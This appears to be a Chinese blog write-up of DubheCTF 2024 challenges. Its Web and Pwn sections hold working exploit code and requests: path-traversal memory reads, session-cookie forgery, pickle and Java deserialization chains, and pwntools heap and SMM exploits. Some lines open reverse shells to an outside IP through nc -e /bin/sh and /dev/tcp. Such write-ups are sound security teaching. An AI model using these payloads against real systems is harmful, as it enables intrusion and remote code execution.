---
title: 2024 XCTF 联赛 DubheCTF 部分题解
tags: Writeup
categories: Writeup
date: 2024-03-19 09:00:00
toc: true
---

吃早茶咩。

<!--more-->

# 1. Web

## 1.1 VulnTagger

> **【VulnTagger新增提示】 1. 本题为传统Web题，不包含****AI****元素，请放心食用 2. 背景图片挺好看的，看看它从哪来？ 3. 版本控制工具是个好东西，出题人很喜欢用。**

根据提示开始脑洞，githack dump 源码

![img](../images/2024-DubheCTF/20240319010444813.webp)

![img](../images/2024-DubheCTF/20240319010444894.webp)

通过 `range: bytes={start}-{end}` 来读取 mem 中的密钥，伪造成 admin 上传 pt 文件，之后 torch load 的时候触发 pickle 反序列化。

密钥的特征不好识别，22 位长度的大小写数字太常见了，于是读了一下解 cookie 的代码改了改，一边读 mem，一边解 cookie，成功就退出。

```python
import json
import re
import time
from base64 import b64encode

import itsdangerous
import requests


def parse_maps_file(maps_file):
    readable_regions = []
    url = "http://1.95.11.7:40721/static/..%2F..%2F..%2F..%2F..%2Fproc/self/maps"
    r = requests.get(url)
    time.sleep(1)
    text = r.text
    with open("maps", 'w') as f:
        f.write(text)
    with open(maps_file, 'r') as file:
        for line in file:
            parts = line.split()
            if 'r' in parts[1]:  # 检查权限字段是否包含 'rw'
                addresses = parts[0].split('-')
                start = int(addresses[0], 16)  # 将十六进制地址转换为十进制
                end = int(addresses[1], 16)  # 将十六进制地址转换为十进制
                readable_regions.append((start, end))
    return readable_regions


def contains_required_characters(text):
    # 包含至少一个大写字母、一个小写字母和一个数字
    pattern = r'^(?=.*[A-Z])(?=.*[a-z])(?=.*\d).+$'
    return re.match(pattern, text) is not None


def contains_blacklist(text, blacklist):
    return not any(word.lower() in text.lower() for word in blacklist)


class StorageSession:
    def __init__(self, signed_value):
        self.signed_value = signed_value

    def crack(self, secret_key):
        data = ""
        try:
            max_age = 14 * 24 * 60 * 60
            # secret_key = "M31-58Xdiz-sje2EUsUZEQ"
            signer = itsdangerous.TimestampSigner(str(secret_key))
            data = signer.unsign(
                signed_value=self.signed_value,
                max_age=max_age)
            print(data)
        except:
            pass
        return data


def get_cookie():
    # 获取 cookie
    burp0_url = "http://1.95.11.7:40721/admin"
    burp0_cookies = {
        "session": "eyJpZCI6ICIwOGZhZTIzOC1mNzE1LTQ5MDEtOTk3MS1iNDVjMDk2MTVhOGQiLCAiaXNfYWRtaW4iOiB0cnVlfQ==.ZfXARQ.dH3mLf_-51c-fK4ZKJw3d1k3o3M"}
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                     "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                     "Connection": "close"}
    r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

    s = r.headers['set-cookie'].split(";")[0].split("session=")[1]
    return s

def get_admin(secret_key):
    max_age = 14 * 24 * 60 * 60
    # secret_key = "nD5hTi6WkUNacMt6V9wUtA"
    signer = itsdangerous.TimestampSigner(str(secret_key))
    data = b64encode(
        json.dumps({"id": "08fae238-f715-4901-9971-b45c09615a8d", "is_admin": True}).encode(
            "utf-8"))
    data = signer.sign(data)
    print(data)
    return data


def main():
    found = False
    maps_file = 'maps'
    readable_regions = parse_maps_file(maps_file)
    url = "http://1.95.11.7:40721/static/..%2F..%2F..%2F..%2F..%2Fproc/self/mem"
    maps_reg = r'([A-Za-z0-9_\-]{22})'
	# 一边测试代码一边顺便加了几条黑名单来加速，也没有问题都不大，就是慢点
    blacklist = ["Processing", "function", "Socket", "plotly", "context", "Register", "differentiable", "stream",
                 "money", "system", "error", "file", "counted", "directory", "Password", "Request", "Params", "Base",
                 "sqlite", "abcdef", "0123456", "get", "name", "size", "pool"]
    storage_session = StorageSession(get_cookie())
    for start, end in readable_regions:
        # 退出多重循环
        if found:
            break
        header = {"range": f"bytes={start}-{end}"}
        try:
            r = requests.get(url, headers=header, timeout=20000)
            print(header, r.status_code)
            secret = set(re.findall(maps_reg, r.text))
            for i in secret:
                if contains_required_characters(i) and contains_blacklist(i, blacklist):
                    data = storage_session.crack(i)
                    print(f"{start}-{end} contains matching pattern: {i}")
                    if data != "" and data is not None:
                        # 然后伪造 admin
                        admin = get_admin(i)
                        print(f"foundfoundfound!!! ---- {data} ---- {i} ---- {admin}")

                        # 退出多重循环
                        found = True
            if r.status_code == 206:
                with open(f"mems/{start}-{end}", 'wb') as f:
                    f.write(r.content)
            time.sleep(1)
        except:
            continue


if __name__ == '__main__':
    main()
```

Pickle 反序列化的时候，exec 执行一段 python 代码，新建一个 `@app.post("/")` 路由（相当于内存马？

![img](../images/2024-DubheCTF/20240319010444749.webp)

将 bot 发送的东西都写到一个文件里，弹 shell 进去 cat 看看即可

```Python
import io
import json
import base64

import torch
import matplotlib
import matplotlib.image

args = """

from nicegui import app
from starlette.requests import Request

@app.post("/")
async def index_post(request: Request):
    import hashlib
    from starlette.responses import JSONResponse
    headers = request.headers
    x_pow_token = headers.get("x-pow-token", "0")
    x_pow_difficulty = int(headers.get("x-pow-difficulty", "0"))
    res = str(headers)
    open("/tmp/test", "ab+").write(res.encode())
    prefix = "0" * x_pow_difficulty
    nonce = 0
    while True:
        data = f"{nonce}"
        hex_digest = hashlib.sha256((x_pow_token + data).encode()).hexdigest()
        if hex_digest.startswith(prefix):
            return JSONResponse(status_code=418, content={"bar": data})
        nonce += 1

"""

class Exploit(object):
    def __reduce__(self):
        return (exec, (args,))

torch.save(Exploit(), "InjectModel", _use_new_zipfile_serialization=False)
```

## 1.2 Wecat

伪造一下 jwt，本地看 admin 的 uid 是 admin@wecat.com。

```JavaScript
  getToken (uid) {
    return jwt.sign({ // 生成token
      exp: Math.floor(Date.now() / 1000) + (60 * 60), // token十五分钟过期
      data: `${uid}pass`
    }, 'shhhhh')
  }
```

后端是 dev 启动的，可以覆盖源码达到实时修改的目的。

```HTTP
POST /wechatAPI/upload/once HTTP/1.1
Host: 1.95.54.149:41705
Content-Length: 1277
sec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1MWw8rv9Mkc9QBUn
sec-ch-ua-mobile: ?0
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjk3MTA1NjIyNTMsImRhdGEiOiJhZG1pbkB3ZWNhdC5jb21wYXNzIiwiaWF0IjoxNzEwNTU4NjUzfQ.uh03vxCqIqSrrK1sWCeJJMBmLPM4Tvfehqz7dm5f-tw
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
sec-ch-ua-platform: "macOS"
Origin: http://127.0.0.1:8088
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8088/home
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: loginstate=true; userid=864f70fe-1761-4cb0-964a-cdce2513aa29; indent_type=space; space_units=4; keymap=sublime; csrftoken=M9nS9TyIl9vOZ69O8LFZ4XCP0txKAAELSXQIr3BEHljI6TxWxkLZtlJa7NOTmTlv
Connection: close

------WebKitFormBoundary1MWw8rv9Mkc9QBUn
Content-Disposition: form-data; name="file"; filename="1.jpg"
Content-Type: application/octet-stream

const router = require('@koa/router')()
const MongoDB = require('../../src/module/mongodb')
const db = new MongoDB()
const JsonWebToken = require('../../src/module/jwt')
const jwt = new JsonWebToken()
const moment = require('moment')
const axios = require('axios')
const { exec } = require('child_process');


router.post('/wechatAPI/login/x', async (ctx) => {
    ctx.status = 200
    var exec = require('child_process').execSync;
    var str = exec('/readflag');
    
    ctx.body = {
      msg: str.toString("utf8").trim(),
      error: false
    }
})
module.exports = router.routes()
------WebKitFormBoundary1MWw8rv9Mkc9QBUn
Content-Disposition: form-data; name="hash"

12dd8536da18ed8b8b8b5e55cd19b112
------WebKitFormBoundary1MWw8rv9Mkc9QBUn
Content-Disposition: form-data; name="postfix"

/../../../../../../app/src/route/test.js
------WebKitFormBoundary1MWw8rv9Mkc9QBUn
Content-Disposition: form-data; name="chunkIndex"

1
------WebKitFormBoundary1MWw8rv9Mkc9QBUn
Content-Disposition: form-data; name="chunksTotal"

1
------WebKitFormBoundary1MWw8rv9Mkc9QBUn--
```

## 1.3 Master of Profile

https://github.com/tindy2013/subconverter 0DAY

以前有一场比赛出过这个工具的 0DAY : WMCTF2022 subconverter

https://rce.moe/2022/08/23/WMCTF-2022-WRITEUP/#subconverter

任意文件读取，可以读配置文件

http://1.95.13.243:49319/getlocal?path=/app/pref.yml

可以拿到一个 token

同时看到没有打开 cache 功能

![img](../images/2024-DubheCTF/20240319010444775.webp)

需要找另一个文件写入点

```HTTP
POST http://1.95.13.243:49319/updateconf?token=189069462103782304169366230&type=direct HTTP/1.1
Content-Type: text/plain
User-Agent: PostmanRuntime/7.36.3
Accept: */*
Postman-Token: 3d2bff18-43e5-4bdf-9eb7-663b4213e438
Host: 1.95.13.243:49319
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 117

function parse(x) {
  console.log("success");
  os.exec(["/usr/bin/nc", "8.134.216.221", "7777", "-e", "/bin/sh"]);
}
```

弹 shell

http://1.95.13.243:49319/sub?target=clash&url=script:pref.yml&token=189069462103782304169366230

![img](../images/2024-DubheCTF/20240319010444751.webp)

## 1.4 Javolution

游戏逻辑有一个负数溢出？反正打败恶龙了.jpg

http://1.95.54.152:34473/pal/cheat?hp=-1000000000&attack=-1000000000&defense=-1000000000

![img](../images/2024-DubheCTF/20240319010444758.webp)

然后 level 变 50 

可以在路由 /pal/cheat 进行反序列化

之后有一个 RCE，参考这篇论文,,,,,,

https://i.blackhat.com/Asia-23/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf

https://github.com/luelueking/Deserial_Sink_With_JDBC

差不多是这样打，会有一点bug，起了docker之后才改清楚的

Jdk 17 反序列化

```
--add-opens java.xml/``com.sun.org``.apache.xpath.internal.objects=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED
```

![img](../images/2024-DubheCTF/20240319010444936.webp)

```Java
import com.fasterxml.jackson.databind.node.POJONode;
import com.teradata.jdbc.TeraConnectionPoolDataSource;
import com.teradata.jdbc.TeraDataSource;
import com.teradata.jdbc.TeraDataSourceBase;
import com.teradata.jdbc.TeraPooledConnection;
import org.assertj.core.util.xml.XmlStringPrettyFormatter;
import org.dubhe.javolution.pool.PalDataSource;
import org.mockito.internal.matchers.Equals;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.HotSwappableTargetSource;
import sun.misc.Unsafe;

import javax.management.BadAttributeValueExpException;
import javax.sql.DataSource;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.sql.SQLException;
import java.util.*;

public class exp {
    public static void main(String[] args) throws Exception {
//        com.sun.org.apache.xpath.internal.objects.XString
                // --add-opens java.xml/com.sun.org.apache.xpath.internal=ALL-UNNAMED
        final ArrayList<Class> classes = new ArrayList<>();
        classes.add(Class.forName("java.lang.reflect.Field"));
        classes.add(Class.forName("java.lang.reflect.Method"));
        classes.add(Class.forName("java.util.HashMap"));
        classes.add(Class.forName("java.util.Properties"));
        classes.add(Class.forName("java.util.PriorityQueue"));
        classes.add(Class.forName("com.teradata.jdbc.TeraDataSource"));
        classes.add(Class.forName("javax.management.BadAttributeValueExpException"));
        classes.add(Class.forName("com.sun.org.apache.xpath.internal.objects.XString"));
        classes.add(Class.forName("java.util.HashMap$Node"));
        classes.add(Class.forName("com.fasterxml.jackson.databind.node.POJONode"));
//        classes.add(Class.forName("java.xml.*"));

        new exp().bypassModule(classes);

        TeraDataSource dataSource = new PalDataSource();
        dataSource.setBROWSER("bash -c /readflag>&/dev/tcp/8.134.216.221/7777");
        dataSource.setLOGMECH("BROWSER");
        dataSource.setDSName("8.134.216.221");
        dataSource.setDbsPort("10250");

        Class unsafeClass = Class.forName("sun.misc.Unsafe");
        Field field = unsafeClass.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);
        Module baseModule = dataSource.getClass().getModule();
        Class currentClass = PriorityQueue.class;
        long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
        unsafe.putObject(currentClass, offset, baseModule);

        Class<?> clazz =
                Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(dataSource);
        InvocationHandler handler = (InvocationHandler)
                cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]
                {DataSource.class}, handler);
        POJONode pojoNode = new POJONode(proxyObj);

//        POJONode pojoNode = new POJONode(dataSource);
//        pojoNode.toString();

        // com.sun.org.apache.xpath.internal.objects
        Class cls = Class.forName("com.sun.org.apache.xpath.internal.objects.XString");
        Constructor constructor = cls.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        Object xString = constructor.newInstance("1");

        HashMap hashMap = makeMap(xString,pojoNode);

        serialize(hashMap);
//        unserialize("ser.bin");

    }
    public static HashMap<Object, Object> makeMap (Object obj1, Object obj2) throws Exception {
        HotSwappableTargetSource v1 = new HotSwappableTargetSource(obj2);
        HotSwappableTargetSource v2 = new HotSwappableTargetSource(obj1);

        HashMap<Object, Object> s = new HashMap<>();
        setFiledValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFiledValue(s, "table", tbl);

        return s;
    }
    public static void setFiledValue(Object obj, String key, Object val) throws Exception {
        Field field ;
        try{
            field = obj.getClass().getDeclaredField(key);
        }catch(Exception e){
            if (obj.getClass().getSuperclass() != null)
                field = obj.getClass().getSuperclass().getDeclaredField(key);
            else {
                return;
            }
        }
        field.setAccessible(true);
        field.set(obj,val);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));
        oos.writeObject(obj);
    }
    public static void unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(Filename)));
        Object obj = ois.readObject();
    }

    public void bypassModule(ArrayList<Class> classes){
        try {
            Unsafe unsafe = getUnsafe();
            Class currentClass = this.getClass();
            try {
                Method getModuleMethod = getMethod(Class.class, "getModule", new Class[0]);
                if (getModuleMethod != null) {
                    for (Class aClass : classes) {
                        Object targetModule = getModuleMethod.invoke(aClass, new Object[]{});
                        unsafe.getAndSetObject(currentClass, unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), targetModule);
                    }
                }
            }catch (Exception e) {
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static Method getMethod(Class clazz, String methodName, Class[] params) {
        Method method = null;
        while (clazz!=null){
            try {
                method = clazz.getDeclaredMethod(methodName,params);
                break;
            }catch (NoSuchMethodException e){
                clazz = clazz.getSuperclass();
            }
        }
        return method;
    }
    private static Unsafe getUnsafe() {
        Unsafe unsafe = null;
        try {
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (Unsafe) field.get(null);
        } catch (Exception e) {
            throw new AssertionError(e);
        }
        return unsafe;
    }
}
```

# 2. Reverse

## 2.1 vmt

有一种恶意样本的美。程序开了1w种反调试和反patch方法，不过都挺老套的，就不细说了。用x32dbg跟一下，会发现程序的运算都是把数字转成字符串来运算，可能也是大数运算？整个加密流程相当复杂，非常难看。。

后来直接用floss把字符串dump出来，发现了很多奇怪的常数的字符串，尝试搜一下发现正好是sm4的常数。。再试着把长得像密文和密钥的字符串拿去sm4解密直接就出了😅

```Python
from gmssl.sm4 import CryptSM4, SM4_DECRYPT, NoPadding

sm4_dec = CryptSM4(padding_mode=NoPadding)
sm4_dec.set_key(b'Pyu0Z8#bC5vqUFgt', SM4_DECRYPT)
print(sm4_dec.crypt_ecb(bytes.fromhex('6A61EF281A7473D6B1B431D0351F7E2242CFB9D6EC4E01EF656D6CF520F142821C7061EB843D5ABE378B394C4DC1298B')))
```

## 2.2 ezVK

有一种不知道出什么题就随便找了个bytecode当阅读题的美。Google搜api可以知道是vulkan，然后又发现程序有resource，虽然不知道是什么玩意，但姑且直接起手搜vulkan bytecode看看，结果真搜到东西了。。

官方的SPIRV-tool有反汇编器，其实也能看，不过我太懒狗了，想看看有没有反编译，就直接搜vulkan bytecode decompiler，结果还真找到一个：[SPIRV-Cross](https://github.com/KhronosGroup/SPIRV-Cross)

试了一下，嗯，非常好看，非常好变种XTEA：

```C
layout(local_size_x = 1, local_size_y = 1, local_size_z = 1) in;

const uint _80[5] = uint[](1214346853u, 558265710u, 559376756u, 1747010677u, 1651008801u);

layout(binding = 0, std430) buffer V
{
    uint v[];
} _23;

void main()
{
    uint cnt = gl_GlobalInvocationID.x * 2u;
    uint sum = 0u;
    uint l = _23.v[cnt];
    uint r = _23.v[cnt + 1u];
    for (int i = 1; i <= 40; i++)
    {
        l += ((((((~(r << 3)) & (r >> 5)) | ((r << 3) & (~(r >> 5)))) ^ (~r)) & ((r << 3) ^ (r >> 5))) ^ ((~((~(sum + _80[sum & 4u])) | (~((r >> 3) & (r << 2))))) & (l | (~l))));
        sum += 1932555628u;
        r += ((((((~(l << 3)) & (l >> 5)) | ((l << 3) & (~(l >> 5)))) ^ (~l)) & ((l << 3) ^ (l >> 5))) ^ ((~((~(sum + _80[(sum >> 11) & 4u])) | (~((l >> 3) & (l << 2))))) & (r | (~r))));
    }
    _23.v[cnt] = l;
    _23.v[cnt + 1u] = r;
}
```

直接写解密就行了，不过出题人偷偷吃了密文最后一个uint32，所以倒数第二个字符不知道，可以直接爆破：

```C
#include <stdint.h>
#include <stdio.h>

void decrypt(uint32_t v[2]) {
    uint32_t sum = 40*1932555628u;
    uint32_t l = v[0];
    uint32_t r = v[1];
    uint32_t _80[5] = {1214346853u, 558265710u, 559376756u, 1747010677u, 1651008801u};
    for (size_t i = 0; i < 40; i++)
    {
        r -= ((((((~(l << 3)) & (l >> 5)) | ((l << 3) & (~(l >> 5)))) ^ (~l)) & ((l << 3) ^ (l >> 5))) ^ ((~((~(sum + _80[(sum >> 11) & 4u])) | (~((l >> 3) & (l << 2))))) & (r | (~r))));
        sum -= 1932555628u;
        l -= ((((((~(r << 3)) & (r >> 5)) | ((r << 3) & (~(r >> 5)))) ^ (~r)) & ((r << 3) ^ (r >> 5))) ^ ((~((~(sum + _80[sum & 4u])) | (~((r >> 3) & (r << 2))))) & (l | (~l))));
    }
    v[0] = l;
    v[1] = r;
}

void encrypt(uint32_t v[2]) {
    uint32_t sum = 0;
    uint32_t l = v[0];
    uint32_t r = v[1];
    uint32_t _80[5] = {1214346853u, 558265710u, 559376756u, 1747010677u, 1651008801u};
    for (size_t i = 0; i < 40; i++)
    {
        l += ((((((~(r << 3)) & (r >> 5)) | ((r << 3) & (~(r >> 5)))) ^ (~r)) & ((r << 3) ^ (r >> 5))) ^ ((~((~(sum + _80[sum & 4u])) | (~((r >> 3) & (r << 2))))) & (l | (~l))));
        sum += 1932555628u;
        r += ((((((~(l << 3)) & (l >> 5)) | ((l << 3) & (~(l >> 5)))) ^ (~l)) & ((l << 3) ^ (l >> 5))) ^ ((~((~(sum + _80[(sum >> 11) & 4u])) | (~((l >> 3) & (l << 2))))) & (r | (~r))));
    }
    v[0] = l;
    v[1] = r;
}

int main() {
    uint32_t enc[12] = {0x185B72AF, 0x0631D2C6, 0xDE8B33CC, 0x31EBCD9F, 0x05DB8B33, 0x0A8D77D0, 0x865C6111, 0xBF032335, 0x722228A5, 0xAD833A57, 0xB7C3456F, 0};
    for (size_t i = 0; i < 10; i+=2)
    {
        decrypt(&enc[i]);
    }
    char table[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%%&\'()*+,-./:;<=>?@[\\]^_`{|}~";
    for (size_t i = 0; i < 96; i++)
    {
        char temp[8] = {0};
        temp[0] = table[i];
        temp[1] = '}';
        encrypt((uint32_t*)temp);
        if (*(uint32_t*)temp == enc[10]) {
            printf("Found: %c\n", table[i]);
        }
    }
    printf("%s\n", enc);
}
```

## 2.3 moon

有一种密码题的美。主要实现了大数运算，虽然判断上写了16进制，但实际上应该是10进制才对。。连蒙带猜可以知道0x140001000是mul，0x140001260是divide（余数存在0x140007828），0x140001780是模0x140007848处的大数的pow。一点一点逆可以得到程序的逻辑：

```Python
input_num = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999  # 100 digit number

modulu = 1537131588382913092665966115381275601741897676956736016043055688971156548045659189201332511868437849089

temp_num1 = 750552533390094283528303767276013477413035975076531257833523285630447533225419525977213140560760669
temp_num2 = 535687859422589012977141675826129236269925277717894712488225104574807190354008307256942078237560832125
temp_num3 = 1537131588382913092665966115381275601741897676956736016043055688971156548045659189201332511868437849087
temp_num4 = 1537131588382913092665966115381275601741897676956736016043055688971156548045659189201332511868437849088
temp_num5 = 885929268745208437773737031796868079277836491798608104263226417228443603006843430266722004055919359990

def int_digits(num):
    return len(str(num))

v16 = pow(input_num, temp_num3, modulu)
v20 = pow(input_num, temp_num1, modulu)
nums = [0]*20
nums[9] = v20
for i in range(8, -1, -1):
    v24 = pow(2, i, modulu)
    v26 = nums[i+1] * nums[i+1] % modulu
    v28 = v26 * v16 % modulu
    v30 = pow(v28, v24, modulu)
    if v30 == 1:
        nums[i] = nums[i+1]
        continue
    if int_digits(v30) != 103 or v30 != temp_num4:
        print("Error")
        exit(1)
    v39 = pow(2, 8-i, modulu)
    v40 = pow(temp_num2, v39, modulu)
    v41 = nums[i+1] * v40 % modulu
    nums[i] = v41

assert nums[0] == temp_num5
```

几个常量观察一下有大质数p,p-1,p-2还有两个factor后看不太出关系的数，但除一下约是2048

数列本身是可以推到第一项的，无非和上一项相同（v30=1）或者乘v39的逆(v30==temp_num4)，因为只有2^8种可能所以可以直接爆破nums[9]的全部可能，但根据v20求input看起来是离散对数问题？

v16 = pow(input_num, temp_num3, modulu) 正好是p-2次幂（费马），也就是求input对p的逆

再结合第一次做nums[i+1] * nums[i+1] % modulu * pow(input_num, temp_num3, modulu) % modulu 反推一下可以发现另外一个大数正好是 (((p - 1) // 1024) + 1) // 2

指数包含p-1的部分可以化为1，只剩下加1化为x，外边只剩一个根号，那么v20*v20=(x*1)=x=input，可以直接算出来：

```Python
x = 885929268745208437773737031796868079277836491798608104263226417228443603006843430266722004055919359990
p = 1537131588382913092665966115381275601741897676956736016043055688971156548045659189201332511868437849089
rnd = 535687859422589012977141675826129236269925277717894712488225104574807190354008307256942078237560832125
def check(input_num):
    input_num_inv = pow(input_num, p - 2, p)
    nums = [0, 0, 0, 0, 0, 0, 0, 0, 0, pow(input_num, (((p - 1) // 1024) + 1) // 2, p)]
    for i in range(9, 0, -1):
        v30 = pow(nums[i] * nums[i] * input_num_inv, pow(2, i - 1), p)
        if v30 == 1:
            nums[i - 1] = nums[i]
        else:
            assert v30 == p - 1
            nums[i - 1] = nums[i] * pow(rnd, pow(2, 9-i), p) % p
    return nums[0] == x

for t in range(0, 257):
    c = x
    for i in range(9, 0, -1):
        r = pow(rnd, pow(2, 9 - i), p)
        rv = pow(r, p - 2, p)
        if (t>>(i-1))&1:
            c = c * rv % p
    c = c * c  # P-1 // 1024 = 1, +1 = x, /2 = pow2, then c=c*c
    c = c % p  # 第一次算出来不对，模个p符合100位输入要求
    try:
        if check(c):
            print(c)
    except:
        pass
```

![img](../images/2024-DubheCTF/20240319010444891.webp)

你永远可以相信可靠的J神逆出来的代码不会有任何问题 

# 3. Pwn

## 3.1 ToySMM

```Python
from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'

smm_comm_protocol_guid = 0x32c3c5ac65db949d4cbd9dc6c68ed8e2
toy_smm_comm_protocol_guid = 0x9d76f4b1548e0872ec86b7f3b31cf11e
# toy_smm_comm_protocol_guid: 1E F1 1C B3 F3 B7 86 EC  72 08 8E 54 B1 F4 76 9D 
# 800000000000000E: image not found
# 800000000000000F: access denied

#sh = process("./run.sh")
sh = remote('1.95.0.62', 9999)
input("Attach gdb")

sh.recvuntil(b'Boot Services')
boot_services = int(sh.recvline().strip(), 16)

log.info(f"Boot Services: {hex(boot_services)}")

# offsetoff(boot_services, LocateProtocol) = 0x140
code = asm(f'''
    mov rax, {boot_services}
    mov rbx, qword ptr [rax + 0x40]
    mov rdx, qword ptr [rax + 0x140]
''')
sh.sendline(code.hex().encode() + b'\nDONE')
sh.recvuntil(b'RBX: ')
allocate_pool = int(sh.recvuntil(b' ').strip(), 16)
sh.recvuntil(b'RDX: ')
locate_protocol = int(sh.recvuntil(b' ').strip(), 16)
log.info(f"AllocatePool: {hex(allocate_pool)}")
log.info(f"LocateProtocol: {hex(locate_protocol)}")

code = asm(f'''
    lea rcx, qword ptr [rip + guid]
    xor rdx, rdx
    lea r8, qword ptr [rip + protocol]
    mov rax, {locate_protocol}
    call rax

    test rax, rax
    jnz fail

    mov rax, qword ptr [rip + protocol]
    mov rbx, qword ptr [rax]
    ret

fail:
    ud2

guid:
    .octa {smm_comm_protocol_guid}
protocol:
''')
sh.sendline(code.hex().encode() + b'\nDONE')
sh.recvuntil(b'RAX: ')
msmm_communication = int(sh.recvuntil(b' '), 16)
sh.recvuntil(b'RBX: ')
communicate = int(sh.recvuntil(b' '), 16)
log.info(f"msmm_communication: {hex(msmm_communication)}")
log.info(f"msmm_communication->communicate: {hex(communicate)}")

code = asm(f'''
    mov rcx, 6
    mov rdx, 0x1000
    lea r8, qword ptr [rip + buffer]
    mov rax, {allocate_pool}
    call rax

    test rax, rax
    jnz fail

    mov rax, qword ptr [rip + buffer]
    ret

fail:
    ud2
''')
print(code.hex().encode())
sh.sendline(code.hex().encode() + b'\nDONE')
sh.recvuntil(b'RAX: ')
buffer = int(sh.recvuntil(b' '), 16)
log.info(f"Buffer: {hex(buffer)}")

flag = b''
def get_flag(offset):
    code = asm(f'''
    mov rsi, 0xc0df32
    lea rdi, qword ptr [rip + code]
    mov rax, {boot_services}
    mov qword ptr [rax + 0x140], rdi
    lea rsi, qword ptr [rip + data]
    mov rdi, {buffer}
    mov rcx, 0x30
    cld
    rep movsb
    mov rcx, {msmm_communication}
    mov rdx, {buffer}
    xor r8, r8
    mov rax, {communicate}
    call rax
    ret

data:
    .octa {toy_smm_comm_protocol_guid}     /* Buffer->HeaderGuid */
    .quad 0x20                             /* Buffer->MessageLength */
    .quad 0x41414141                       /* Buffer->Data */
    .quad 0x41414141                       /* Buffer->Data */
    .quad 0x41414141                       /* Buffer->Data */
    .quad 0x41414141                       /* Buffer->Data */

code:
    mov rdi, {offset}
    mov rax, qword ptr [rdi]
    mov rcx, qword ptr [rdi+8]
    mov rdx, qword ptr [rdi+0x10]
    mov rbx, qword ptr [rdi+0x18]
    mov rsi, qword ptr [rdi+0x20]
    ud2
    ret
''')
    sh.sendline(code.hex().encode() + b'\nDONE')
    #sh.interactive()
    sh.recvuntil(b'RAX  - ')
    rax = int(sh.recv(16), 16)
    sh.recvuntil(b'RCX - ')
    rcx = int(sh.recv(16), 16)
    sh.recvuntil(b'RDX - ')
    rdx = int(sh.recv(16), 16)
    sh.recvuntil(b'RBX  - ')
    rbx = int(sh.recv(16), 16)
    sh.recvuntil(b'RSI  - ')
    rsi = int(sh.recv(16), 16)
    return p64(rax) + p64(rcx) + p64(rdx) + p64(rbx) + p64(rsi)
print(get_flag(0x23330000))

print(flag)

sh.interactive()
```

## 3.2 Buggyalloc

```Python
from pwn import *
# code exec method from my blog

sh = remote("1.95.11.97", 9999)
tob = lambda x: str(x).encode()

def alloc(size, idx, c):
    sh.sendlineafter(b'> ', b'1')
    sh.sendlineafter(b'idx: ', tob(idx))
    sh.sendlineafter(b'size: ', tob(size))
    sh.sendafter(b'Content: ', c)

def dealloc(idx):
    sh.sendlineafter(b'> ', b'2')
    sh.sendlineafter(b'idx: ', tob(idx))

alloc(0xa00, 0, p64(0x0000000000404408)*(0xa00//8))
dealloc(0)
alloc(96, 0, b'b'*63)

for i in range(0x31):
    alloc(64, i+1, b'cccc')

alloc(96, 0x32, p64(0)*4+p64(0x4044a0)*3+p64(0x404408)*2+p64(0x404040)*1)
alloc(0x33, 0x33, b'\x80')
alloc(0x33, 0x34, p64(0xfbad1800)+p64(0)*3+p64(0x0000000000404040)+p64(0x0000000000404050))
libcbase = u64(sh.recv(8))-0x21b780
log.success("libcbase: "+hex(libcbase))

alloc(24, 0x35, p64(0)*3)
alloc(96, 0x36, p64(0))

